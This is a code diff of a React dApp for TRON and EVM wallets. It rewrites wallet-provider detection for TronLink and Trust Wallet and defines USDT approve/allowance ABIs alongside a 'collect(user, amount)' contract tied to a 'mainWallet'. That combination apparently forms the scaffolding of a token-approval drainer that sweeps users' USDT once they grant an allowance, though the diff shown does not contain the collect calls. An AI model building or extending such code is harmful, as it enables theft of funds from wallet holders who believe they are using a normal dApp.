@@ -135,17 +135,16 @@ createAppKit({
 
 // === TRON ABIs ===
 const USDT_ABI = [
-  { constant: true, inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-  { constant: true, inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
+  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
+  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
+  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
 ]
 
 const COLLECT_ABI = [
-  { constant: true, inputs: [], name: 'mainWallet', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
-  { constant: true, inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
-  { constant: false, inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
+  { inputs: [], name: 'mainWallet', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
+  { inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
+  { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
 ]
-
 function inspectTronGlobals() {
   const w = window as any
   return {
@@ -202,22 +201,21 @@ export default function App() {
 const resolveTronWeb = () => {
   const w = window as any;
 
-  // 1. Check standard globals
+  // 1. Check for standard injected globals first (TronLink / Trust Injected)
   if (w.tronWeb?.contract) return w.tronWeb;
   if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
-  
-  // 2. Check the specific Trust Wallet "tron" object
-  if (w.tron?.tronWeb?.contract) return w.tron.tronWeb;
+  if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
 
-  // 3. Check the Reown provider (Most reliable in AppKit)
-  // Reown's Tron provider is often a wrapper that contains the raw tronWeb instance
-  if (tronWalletProvider && (tronWalletProvider as any).tronWeb) {
-    return (tronWalletProvider as any).tronWeb;
-  }
-  
-  // 4. If all else fails, check if the provider itself is the TronWeb instance
-  if (tronWalletProvider && (tronWalletProvider as any).contract) {
-    return tronWalletProvider;
+  // 2. Reach inside the AppKit Provider (Handles the "Keys in Provider" logs you sent)
+  if (tronWalletProvider) {
+    // If it's a TronLink adapter (found in your TronLink logs)
+    if ((tronWalletProvider as any).adapter?.tronWeb?.contract) {
+      return (tronWalletProvider as any).adapter.tronWeb;
+    }
+    // If the provider itself is the tronWeb instance
+    if ((tronWalletProvider as any).tronWeb?.contract) {
+      return (tronWalletProvider as any).tronWeb;
+    }
   }
 
   return null;
@@ -234,50 +232,41 @@ const resolveTronWeb = () => {
   // 2. Update the useEffect to "Wait" for injection
 useEffect(() => {
   const init = async () => {
-    if (!isConnected || !walletAddress) return
+    if (!isConnected || !walletAddress) return;
 
-    log(`Connected: ${caipAddress}`)
+    log(`Connected: ${caipAddress}`);
 
     if (isTron) {
-      setStatus('Detecting TRON Provider...')
+      setStatus('Initializing TRON...');
       
-      // Attempt to find TronWeb immediately
-      let injectedTronWeb = resolveTronWeb()
+      let finalTronWeb = null;
 
-      // If not found, wait up to 3 seconds (Mobile browsers can be slow to inject)
-      if (!injectedTronWeb) {
-        log('Waiting for Provider injection...')
-        for (let i = 0; i < 6; i++) { 
-          await new Promise(r => setTimeout(r, 500))
-          injectedTronWeb = resolveTronWeb()
-          if (injectedTronWeb) break
+      // Retry loop to catch slow injection
+      for (let i = 0; i < 10; i++) {
+        finalTronWeb = resolveTronWeb();
+        
+        // Trust Wallet specific: It might have the object but no address yet
+        if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) {
+          break;
         }
+        await new Promise(r => setTimeout(r, 500));
       }
 
-      if (!injectedTronWeb) {
-        const globals = inspectTronGlobals()
-        log(`❌ No TronWeb after wait. Globals: ${JSON.stringify(globals)}`)
-        setStatus('TRON detected, but Provider is hidden. Try refreshing the dApp.')
-        return
+      if (!finalTronWeb) {
+        log(`❌ Provider Missing. Globals: ${JSON.stringify(inspectTronGlobals())}`);
+        setStatus('TRON Provider not found. Please refresh.');
+        return;
       }
 
-      if (tronWalletProvider) {
-    console.log("Full Tron Provider Object:", tronWalletProvider);
-    log("Keys in Provider: " + Object.keys(tronWalletProvider).join(', '));
-  }
-
-      log('✅ TRON Provider Found')
-      await getTronBalance(injectedTronWeb, walletAddress)
-      return
+      log('✅ TRON Provider Found');
+      await getTronBalance(finalTronWeb, walletAddress);
+    } else if (isEVM) {
+      await getBalanceForCurrentChain();
     }
+  };
 
-    if (isEVM) {
-      await getBalanceForCurrentChain()
-    }
-  }
-
-  init()
-}, [isConnected, walletAddress, caipAddress, evmWalletProvider, tronWalletProvider, isTron, isEVM, tronWalletProvider])
+  init();
+}, [isConnected, walletAddress, caipAddress, evmWalletProvider, tronWalletProvider, isTron, isEVM]);
 
   const getTronBalance = async (tw: any, addr: string) => {
     try {
